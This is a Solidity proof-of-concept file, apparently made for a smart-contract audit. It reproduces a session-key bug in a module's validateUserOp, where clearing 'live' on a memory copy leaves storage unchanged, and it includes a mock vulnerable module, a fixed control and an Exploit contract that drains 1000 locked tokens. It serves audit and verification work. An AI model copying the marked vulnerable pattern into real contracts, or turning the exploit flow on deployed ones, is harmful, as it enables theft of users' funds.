// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  CredibleAccountModule.validateUserOp — SessionData is loaded into memory
    (Shieldify, finding 61406).
    SYNTHETIC, cheatcode-free reduction.
    Root cause: `SessionData memory sd` copies the session. `sd.live = false`
    does not write storage. The module still treats the session as live
    (_isSessionKeyExpired / getLiveSessionKeysForWallet key off `live`), so
    the session key pulls the 1000 tokens the validation was supposed to retire.
    The blamed lines are preserved (@> VULN). */

contract MockERC20 {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

struct SessionData {
    bool live;
    uint48 validUntil;
    uint256 locked;
}

contract CredibleAccountModule {
    mapping(address => mapping(address => SessionData)) public sessionData;
    MockERC20 public token;
    bool public immutable useStorage;
    uint256 public constant LOCKED = 1000 ether;

    constructor(MockERC20 t, bool useStorage_) {
        token = t;
        useStorage = useStorage_;
    }

    function enable(address sessionKey, address wallet) external {
        sessionData[sessionKey][wallet] = SessionData({live: true, validUntil: type(uint48).max, locked: LOCKED});
    }

    function validateUserOp(address sessionKeySigner) external {
        if (useStorage) {
            SessionData storage fixedSd = sessionData[sessionKeySigner][msg.sender];
            fixedSd.live = false;
            return;
        }
        SessionData memory sd = sessionData[sessionKeySigner][msg.sender];
        // @> VULN: live is cleared on the memory copy; storage stays true
        sd.live = false;
        if (sd.live) revert("memory live");
    }

    function pull(address sessionKey, address wallet) external {
        SessionData storage sd = sessionData[sessionKey][wallet];
        require(sd.live, "session dead");
        uint256 amount = sd.locked;
        sd.locked = 0;
        sd.live = false;
        token.transfer(msg.sender, amount);
    }
}

contract Wallet {
    function touch(CredibleAccountModule module, address sessionKey) external {
        module.validateUserOp(sessionKey);
    }
}

contract Exploit {
    MockERC20 public token; // nonce 1
    CredibleAccountModule public module; // nonce 2
    Wallet public wallet; // nonce 3
    CredibleAccountModule public control; // nonce 4
    Wallet public controlWallet; // nonce 5

    bool public stillLive;
    uint256 public pulled;
    bool public controlBlocked;

    constructor() {
        token = new MockERC20();
        module = new CredibleAccountModule(token, false);
        wallet = new Wallet();
        control = new CredibleAccountModule(token, true);
        controlWallet = new Wallet();
        module.enable(address(this), address(wallet));
        control.enable(address(this), address(controlWallet));
        token.mint(address(module), 1000 ether);
        token.mint(address(control), 1000 ether);
    }

    function run() external {
        wallet.touch(module, address(this));
        (stillLive,,) = module.sessionData(address(this), address(wallet));
        require(stillLive, "storage live was cleared");
        module.pull(address(this), address(wallet));
        pulled = token.balanceOf(address(this));
        require(pulled == 1000 ether, "session key did not pull 1000");

        controlWallet.touch(control, address(this));
        (bool controlLive,,) = control.sessionData(address(this), address(controlWallet));
        require(!controlLive, "control session stayed live");
        try control.pull(address(this), address(controlWallet)) {
            revert("control paid");
        } catch {
            controlBlocked = true;
        }
        require(controlBlocked, "control pull was not blocked");
        require(token.balanceOf(address(control)) == 1000 ether, "control tokens moved");
    }
}
